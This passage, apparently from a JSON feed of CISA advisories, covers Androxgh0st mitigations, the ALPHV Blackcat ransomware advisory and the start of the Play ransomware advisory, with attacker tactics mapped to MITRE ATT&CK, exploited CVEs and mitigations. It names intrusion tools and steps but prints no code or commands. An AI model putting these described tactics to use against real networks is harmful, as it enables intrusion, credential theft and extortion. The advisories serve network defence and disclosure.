NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>\n<p>These mitigations apply to all critical infrastructure organizations and network defenders. FBI and CISA recommend that software manufacturers incorporate secure by design principles and tactics into their software development practices, limiting the impact of actor techniques and strengthening their customers’ security posture. For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" target=\"_blank\" title=\"Secure by Design\">Secure by Design</a> webpage.</p>\n<p>The FBI and CISA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by actors using Androxgh0st malware.</p>\n<ul><li><strong>Keep all operating systems, software, and firmware up to date. Specifically, ensure that Apache servers are not running versions 2.4.49 or 2.4.50.</strong> Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">known exploited vulnerabilities</a> in internet-facing systems.</li>\n<li><strong>Verify that the default configuration for all URIs is to deny all requests</strong> unless there is a specific need for it to be accessible.</li>\n<li><strong>Ensure that any live Laravel applications are not in “debug” or testing mode. Remove all cloud credentials from </strong><strong><code>.env</code> files and revoke them. All cloud providers have safer ways to provide temporary, frequently rotated credentials to code running inside a web server without storing them in any file.</strong></li>\n<li><strong>On a one-time basis for previously stored cloud credentials, and on an on-going basis for other types of credentials that cannot be removed, review any platforms or services that have credentials listed in the </strong><code><strong>.env</strong></code><strong> file for unauthorized access or use.</strong></li>\n<li><strong>Scan the server’s file system for unrecognized PHP files</strong>, particularly in the root directory or <code>/vendor/phpunit/phpunit/src/Util/PHP</code> folder.</li>\n<li><strong>Review outgoing GET requests (via cURL command) to file hosting sites</strong> such as GitHub, pastebin, etc., particularly when the request accesses a <code>.php</code> file.</li>\n</ul><h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>\n<p>In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>\n<p>To get started:</p>\n<ol><li>Select an ATT&amp;CK technique described in this advisory (see Tables 1-10).</li>\n<li>Align your security technologies against the technique.</li>\n<li>Test your technologies against the technique.</li>\n<li>Analyze your detection and prevention technologies’ performance.</li>\n<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>\n<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>\n</ol><p>FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>\n<h3><strong>REPORTING</strong></h3>\n<p>The FBI encourages organizations to report information concerning suspicious or criminal activity to their <a href=\"https://www.fbi.gov/contact-us/field-offices/\" title=\"Field Offices\">local FBI field office</a>. With regards to specific information that appears in this CSA, indicators should always be evaluated in light of an organization’s complete security situation.</p>\n<p>When available, each report submitted should include the date, time, location, type of activity, number of people, and type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact. Reports can be submitted to the FBI <a href=\"https://www.ic3.gov/\" title=\"Internet Crime Complaint Center (IC3)\">Internet Crime Complaint Center (IC3)</a>, a <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI Field Office</a>, or to CISA via its <a href=\"https://www.cisa.gov/forms/report\" title=\"Incident Reporting System\">Incident Reporting System</a> or its 24/7 Operations Center at <a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or (888) 282-0870.</p>\n<h3><strong>RESOURCES</strong></h3>\n<ul><li><a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">CISA: Known Exploited Vulnerabilities Catalog</a></li>\n<li><a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">CISA, MITRE: Best Practices for MITRE ATT&amp;CK Mapping</a></li>\n<li><a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">CISA: Decider Tool</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-9841\" title=\"CVE-2017-9841\">NIST: CVE-2017-9841</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-15133\" title=\"CVE-2018-15133\">NIST: CVE-2018-15133</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41773\" title=\"CVE-2021-41773\">NIST: CVE-2021-41773</a></li>\n<li><a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">CISA: Cross-Sector Cybersecurity Performance Goals</a></li>\n<li><a href=\"https://www.cisa.gov/securebydesign\" target=\"_blank\" title=\"Secure by Design\">CISA: Secure by Design</a></li>\n</ul><h3><strong>REFERENCES</strong></h3>\n<ol><li><a href=\"https://fortiguard.fortinet.com/threat-signal-report/5066/androxgh0st-malware-actively-used-in-the-wild\" title=\"AndroxGh0st Malware Actively Used in the Wild\">Fortinet - FortiGuard Labs: Threat Signal Report: AndroxGh0st Malware Actively Used in the Wild</a></li>\n</ol><h3><strong>ACKNOWLEDGEMENTS</strong></h3>\n<p>Amazon contributed to this CSA.</p>\n<h3><strong>DISCLAIMER</strong></h3>\n<p>The information in this report is being provided “as is” for informational purposes only. FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI and CISA.</p>\n<h3><strong>VERSION HISTORY</strong></h3>\n<p>January 16, 2024: Initial version.</p>\n","pubDate":"Fri, 12 Jan 2024 12:13:51 EST","dc:creator":"CISA","guid":{"@isPermaLink":"false","#text":"/node/20718"}},{"title":"#StopRansomware: ALPHV Blackcat","link":"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-353a","description":"<h3><strong>SUMMARY</strong></h3>\n<p><strong><em>Note:</em></strong><em> This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit </em><a href=\"https://www.cisa.gov/stopransomware\" title=\"#StopRansomware\"><em>stopransomware.gov</em></a><em> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>\n<p>The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known IOCs and TTPs associated with the ALPHV Blackcat ransomware as a service (RaaS) identified through FBI investigations as recently as Dec. 6, 2023.</p>\n<p>This advisory provides updates to the FBI FLASH <a href=\"https://www.ic3.gov/Media/News/2022/220420.pdf\" title=\"BlackCat/ALPHV Ransomware Indicators of Compromise\">BlackCat/ALPHV Ransomware Indicators of Compromise</a> released April 19, 2022. Since previous reporting, ALPHV Blackcat actors released a new version of the malware, and the FBI identified over 1000 victims worldwide targeted via ransomware and/or data extortion.</p>\n<p>FBI and CISA encourage critical infrastructure organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ALPHV Blackcat ransomware and data extortion incidents.</p>\n<p>In February 2023, ALPHV Blackcat administrators announced the ALPHV Blackcat Ransomware 2.0 Sphynx update, which was rewritten to provide additional features to affiliates, such as better defense evasion and additional tooling. This ALPHV Blackcat update has the capability to encrypt both Windows and Linux devices, and VMWare instances. ALPHV Blackcat affiliates have extensive networks and experience with ransomware and data extortion operations. According to the FBI, as of September 2023, ALPHV Blackcat affiliates have compromised over 1000 entities—nearly 75 percent of which are in the United States and approximately 250 outside the United States—, demanded over $500 million, and received nearly $300 million in ransom payments.</p>\n<p>Download the PDF version of this report:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/aa23-353a-stopransomware-alphv-blackcat_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA23-353A #StopRansomware: ALPHV Blackcat</a>\n    <span class=\"c-file__size\">(PDF,       477.69 KB\n  )</span>\n  </div>\n</div>\n<h3><strong>TECHNICAL DETAILS</strong></h3>\n<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v14/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK<sup>®</sup> for Enterprise</a> framework, version 14. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>\n<p>ALPHV Blackcat affiliates use advanced social engineering techniques and open source research on a company to gain initial access. Actors pose as company IT and/or helpdesk staff and use phone calls or SMS messages [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1598/\" title=\"Phishing for Information\">T1598</a>] to obtain credentials from employees to access the target network [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1586/\" title=\"Compromise Accounts\">T1586</a>]. ALPHV Blackcat affiliates use uniform resource locators (URLs) to live-chat with victims to convey demands and initiate processes to restore the victims’ encrypted files.</p>\n<p>After gaining access to a victim network, ALPHV Blackcat affiliates deploy remote access software such as AnyDesk, Mega sync, and Splashtop in preparation of data exfiltration. After gaining access to networks, ALPHV Blackcat affiliates use legitimate remote access and tunneling tools, such as Plink and Ngrok [<a href=\"https://attack.mitre.org/versions/v14/software/S0508/\" title=\"ngrok\">S0508</a>]. ALPHV Blackcat affiliates claim to use Brute Ratel C4 [<a href=\"https://attack.mitre.org/versions/v14/software/S1063/\" title=\"Brute Ratel C4\">S1063</a>] and Cobalt Strike [<a href=\"https://attack.mitre.org/versions/v14/software/S0154/\" title=\"Cobalt Strike\">S1054</a>] as beacons to command and control servers. ALPHV Blackcat affiliates use the open source adversary-in-the-middle attack [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1557/\" title=\"Adversary-in-the-Middle\">T1557</a>] framework Evilginx2, which allows them to obtain multifactor authentication (MFA) credentials, login credentials, and session cookies. The actors also obtain passwords from the domain controller, local network, and deleted backup servers to move laterally throughout the network [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1555/\" title=\"Credentials from Password Stores\">T1555</a>].</p>\n<p>To evade detection, affiliates employ allowlisted applications such as Metasploit. Once installed on the domain controller, the logs are cleared on the exchange server. Then Mega.nz or Dropbox are used to move, exfiltrate, and/or download victim data. The ransomware is then deployed, and the ransom note is embedded as a file.txt. According to public reporting, affiliates have additionally used POORTRY and STONESTOP to terminate security processes.</p>\n<p>Some ALPHV Blackcat affiliates exfiltrate data after gaining access and extort victims without deploying ransomware. After exfiltrating and/or encrypting data, ALPHV Blackcat affiliates communicate with victims via TOR [<a href=\"https://attack.mitre.org/versions/v14/software/S0183/\" title=\"Tor\">S0183</a>], Tox, email, or encrypted applications. The threat actors then delete victim data from the victim’s system.</p>\n<p>ALPHV Blackcat affiliates offer to provide unsolicited cyber remediation advice as an incentive for payment, offering to provide victims with “vulnerability reports” and “security recommendations” detailing how they penetrated the system and how to prevent future re-victimization upon receipt of ransom payment.</p>\n<h3><strong>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>\n<p>See Table 1 through Table 3 for all referenced threat actor tactics and techniques in this advisory.</p>\n<table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 1: ALPHV Blackcat/ALPHV Threat Actors ATT&amp;CK Techniques - Reconnaissance</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Phishing for Information</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1598/\" title=\"Phishing for Information\">T1598</a></p>\n</td>\n<td>\n<p>ALPHV Blackcat affiliates pose as company IT and/or helpdesk staff using phone calls or SMS messages to obtain credentials from employees to access the target network.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 2: ALPHV Blackcat/ALPHV Threat Actors ATT&amp;CK Techniques – Resource Development</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Compromise Accounts</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1586/\" title=\"Compromise Accounts\">T1586</a></p>\n</td>\n<td>\n<p>ALPHV Blackcat affiliates use compromised accounts to gain access to victims’ networks.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 3: ALPHV Blackcat/ALPHV Threat Actors ATT&amp;CK Techniques – Credential Access</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Obtain Credentials from Passwords Stores</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1555/\" title=\"Credentials from Password Stores\">T1555</a></p>\n</td>\n<td>\n<p>ALPHV Blackcat affiliates obtain passwords from local networks, deleted servers, and domain controllers.</p>\n</td>\n</tr><tr><td>\n<p>Adversary-in-the-Middle</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1557/\" title=\"Adversary-in-the-Middle\">T1557</a></p>\n</td>\n<td>\n<p>ALPHV Blackcat/ALPHV affiliates use the open-source framework Evilginx2 to obtain MFA credentials, login credentials, and session cookies for targeted networks.</p>\n</td>\n</tr></tbody></table><h3><strong>INCIDENT RESPONSE</strong></h3>\n<p>If compromise is detected, organizations should:</p>\n<ol><li>Quarantine or take offline potentially affected hosts.</li>\n<li>Reimage compromised hosts.</li>\n<li>Provision new account credentials.</li>\n<li>Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.</li>\n<li>Report the compromise or phishing incident to CISA via CISA’s 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or 888-282-0870). State, local, tribal, or territorial government entities can also report to MS-ISAC (<a href=\"mailto:SOC@cisecurity.org\" title=\"Report to the Center for Internet Security\">SOC@cisecurity.org</a> or 866-787-4722).</li>\n<li>To report spoofing or phishing attempts (or to report that you’ve been a victim), file a complaint with the FBI’s <a href=\"https://www.ic3.gov/\" title=\"Internet Crime Complaint Center\">Internet Crime Complaint Center (IC3</a><u>)</u>, or contact your local <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">FBI Field Office</a> to report an incident.</li>\n</ol><h3><strong>MITIGATIONS</strong></h3>\n<p>These mitigations apply to all critical infrastructure organizations and network defenders. The FBI and CISA recommend that software manufactures incorporate secure-by-design and -default principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the security posture for their customers.</p>\n<p>For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design</a> webpage and <a href=\"https://www.cisa.gov/resources-tools/resources/secure-by-design-and-default\" title=\"Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software\">joint guide</a>.</p>\n<p>FBI and CISA recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture based on threat actor activity and to reduce the risk of compromise by ALPHV Blackcat threat actors. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" target=\"_blank\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>\n<ul><li>Secure remote access tools by:\n<ul><li><strong>Implementing</strong><strong> application controls</strong> to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.</li>\n<li>Applying recommendations in CISA's joint <a href=\"/sites/default/files/2023-06/Guide%20to%20Securing%20Remote%20Access%20Software_clean%20Final_508c.pdf\" title=\"Guide to Securing Remote Access Software\">Guide to Securing Remote Access Software</a>.</li>\n</ul></li>\n<li><strong>Implementing FIDO/WebAuthn authentication or Public key Infrastructure (PKI)-based MFA </strong>[<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"CPG Report March 2023 Update\">CPG 2.H</a>]. These MFA implementations are resistant to phishing and not susceptible to push bombing or SIM swap attacks, which are techniques known be used by ALPHV Blackcat affiliates. See CISA’s Fact Sheet <a href=\"/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"Implementing Phishing-Resistant MFA\">Implementing Phishing-Resistant MFA</a> for more information.</li>\n<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool.</strong> To aid in detecting ransomware, implement a tool that logs and reports all network traffic [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"CPG Report March 2023 Update\">CPG 5.1</a>], including lateral movement activity on a network. Endpoint detection and response (EDR) tools are useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.</li>\n<li><strong>Implement user training on social engineering and phishing attacks</strong> [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"CPG Report March 2023 Update\">CPG 2.I</a>]. Regularly educate users on identifying suspicious emails and links, not interacting with those suspicious items, and the importance of reporting instances of opening suspicious emails, links, attachments, or other potential lures.</li>\n<li><strong>Implement internal mail and messaging monitoring</strong>. Monitoring internal mail and messaging traffic to identify suspicious activity is essential as users may be phished from outside the targeted network or without the knowledge of the organizational security team. Establish a baseline of normal network traffic and scrutinize any deviations.</li>\n<li><strong>Implement free security tools</strong> to prevent cyber threat actors from redirecting users to malicious websites to steal their credentials. For more information see, CISA’s <a href=\"https://www.cisa.gov/resources-tools/resources/free-cybersecurity-services-and-tools\" title=\"Free Cybersecurity Services and Tools\">Free Cybersecurity Services and Tools</a> webpage.</li>\n<li><strong>Install and maintain antivirus software.</strong> Antivirus software recognizes malware and protects your computer against it. Installing antivirus software from a reputable vendor is an important step in preventing and detecting infections. Always visit vendor sites directly rather than clicking on advertisements or email links. Because attackers are continually creating new viruses and other forms of malicious code, it is important to keep your antivirus software up to date.</li>\n</ul><h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>\n<p>In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>\n<p>To get started:</p>\n<ol><li>Select an ATT&amp;CK technique described in this advisory (see Tables 1-3).</li>\n<li>Align your security technologies against the technique.</li>\n<li>Test your technologies against the technique.</li>\n<li>Analyze your detection and prevention technologies’ performance.</li>\n<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>\n<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>\n</ol><p>CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>\n<h3><strong>RESOURCES</strong></h3>\n<ul><li><a href=\"https://www.cisa.gov/stopransomware\" title=\"#StopRansomware\">Stopransomware.gov</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>\n<li>Resource to reduce the risk of a ransomware attack: <a href=\"https://www.cisa.gov/resources-tools/resources/stopransomware-guide\" title=\"#StopRansomware Guide\">#StopRansomware Guide</a>.</li>\n<li>No-cost cyber hygiene services: <a href=\"https://www.cisa.gov/cyber-hygiene-services\" title=\"Cyber Hygiene Services\">Cyber Hygiene Services</a> and <a href=\"https://github.com/cisagov/cset/releases/tag/v10.3.0.0\" title=\"Ransomware Readiness Assessment CSET v10.3\">Ransomware Readiness Assessment</a>.</li>\n</ul><h3><strong>DISCLAIMER</strong></h3>\n<p>The information in this report is being provided “as is” for informational purposes only. CISA and FBI do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and FBI.</p>\n<h3><strong>VERSION HISTORY</strong></h3>\n<p>December 19, 2023: Initial version.</p>\n","pubDate":"Tue, 19 Dec 2023 09:31:04 EST","dc:creator":"CISA","guid":{"@isPermaLink":"false","#text":"/node/20626"}},{"title":"#StopRansomware: Play Ransomware","link":"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a","description":"<h3><strong>SUMMARY</strong></h3>\n<p><strong><em>Note:</em></strong><em> This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit </em><a href=\"https://www.cisa.gov/stopransomware\" title=\"#StopRansomware\"><em>stopransomware.gov</em></a><em> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>\n<p>The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and Australian Signals Directorate’s Australian Cyber Security Centre (ASD's ACSC) are releasing this joint CSA to disseminate the Play ransomware group’s IOCs and TTPs identified through FBI investigations as recently as October 2023.</p>\n<p>Since June 2022, the Play (also known as Playcrypt) ransomware group has impacted a wide range of businesses and critical infrastructure in North America, South America, and Europe. As of October 2023, the FBI was aware of approximately 300 affected entities allegedly exploited by the ransomware actors.</p>\n<p>In Australia, the first Play ransomware incident was observed in April 2023, and most recently in November 2023.</p>\n<p>The Play ransomware group is presumed to be a closed group, designed to “guarantee the secrecy of deals,” according to a statement on the group’s data leak website. Play ransomware actors employ a double-extortion model, encrypting systems after exfiltrating data. Ransom notes do not include an initial ransom demand or payment instructions, rather, victims are instructed to contact the threat actors via email.</p>\n<p>The FBI, CISA, and ASD’s ACSC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. This includes requiring multifactor authentication, maintaining offline backups of data, implementing a recovery plan, and keeping all operating systems, software, and firmware up to date.</p>\n<p>Download a PDF version of this report:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/aa23-352a-stopransomware-play-ransomware.pdf\" class=\"c-file__link\" target=\"_blank\">AA23-352A #StopRansomware: Play Ransomware</a>\n    <span class=\"c-file__size\">(PDF,       536.19 KB\n  )</span>\n  </div>\n</div>\n<p>For a downloadable copy of IOCs, see:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/AA23-352A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA23-352A STIX XML</a>\n    <span class=\"c-file__size\">(XML,       34.87 KB\n  )</span>\n  </div>\n</div>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/AA23-352A-StopRansomware-Play-Ransomware.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA23-352A STIX JSON</a>\n    <span class=\"c-file__size\">(JSON,       30.22 KB\n  )</span>\n  </div>\n</div>\n<h3><strong>TECHNICAL DETAILS</strong></h3>\n<p><strong>Note: </strong>This advisory uses the <a href=\"https://attack.mitre.org/versions/v14/matrices/enterprise/\">MITRE ATT&amp;CK<sup>®</sup> for Enterprise</a> framework, version 14. See the MITRE ATT&amp;CK for Enterprise section for all referenced tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>\n<h4><strong>Initial Access</strong></h4>\n<p>The Play ransomware group gains initial access to victim networks through the abuse of valid accounts [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>] and exploitation of public-facing applications [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>], specifically through known FortiOS (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-13379\" title=\"CVE-2018-13379\">CVE-2018-13379</a> and <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-12812\" title=\"CVE-2020-12812\">CVE-2020-12812</a>) and Microsoft Exchange (ProxyNotShell [<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-41040\" title=\"CVE-2022-41040\">CVE-2022-41040</a> and <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-41082\" title=\"CVE-2022-41082\">CVE-2022-41082</a>]) vulnerabilities. Play ransomware actors have been observed to use external-facing services [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1133/\" title=\"External Remote Services\">T1133</a>] such as Remote Desktop Protocol (RDP) and Virtual Private Networks (VPN) for initial access.</p>\n<h4><strong>Discovery and Defense Evasion</strong></h4>\n<p>Play ransomware actors use tools like <a href=\"https://attack.mitre.org/versions/v14/software/S0552/\" title=\"AdFind\">AdFind</a> to run Active Directory queries [<a href=\"https://attack.mitre.org/tactics/TA0007/\" title=\"Discovery\">TA0007</a>] and Grixba [<a href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/play-ransomware-volume-shadow-copy\" title=\"Play Ransomware Group Using New Custom Data-Gathering Tools\">1</a>], an information-stealer, to enumerate network information [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1016/\" title=\"System Network Configuration Discovery\">T1016</a>] and scan for anti-virus software [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1518/001/\" title=\"Software Discovery: Security Software Discovery\">T1518.001</a>]. Actors also use tools like GMER, IOBit, and PowerTool to disable anti-virus software [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>] and remove log files [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1070/001/\" title=\"Indicator Removal: Clear Windows Event Logs\">T1070.001</a>]. In some instances, cybersecurity researchers have observed Play ransomware actors using <a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">PowerShell</a> scripts to target Microsoft Defender.[<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-play\" title=\"Ransomware Spotlight | Play\">2</a>]</p>\n<h4><strong>Lateral Movement and Execution</strong></h4>\n<p>Play ransomware actors use command and control (C2) applications, including <a href=\"https://attack.mitre.org/versions/v14/software/S0154/\" title=\"Cobalt Strike\">Cobalt Strike</a> and SystemBC, and tools like <a href=\"https://attack.mitre.org/versions/v14/software/S0029/\" title=\"PsExec\">PsExec</a>, to assist with lateral movement and file execution. Once established on a network, the ransomware actors search for unsecured credentials [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1552/\" title=\"Unsecured Credentials\">T1552</a>] and use the <a href=\"https://attack.mitre.org/versions/v14/software/S0002/\" title=\"Mimikatz\">Mimikatz</a> credential dumper to gain domain administrator access [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>]. According to open source reporting [<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-play\" title=\"Ransomware Spotlight | Play\">2</a>], to further enumerate vulnerabilities, Play ransomware actors use Windows Privilege Escalation Awesome Scripts (WinPEAS) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/\" title=\"Command and Scripting Interpreter\">T1059</a>] to search for additional <a href=\"https://attack.mitre.org/versions/v14/tactics/TA0004/\" title=\"Privilege Escalation\">privilege escalation</a> paths. Actors then distribute executables [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1570/\" title=\"Lateral Tool Transfer\">T1570</a>] via Group Policy Objects 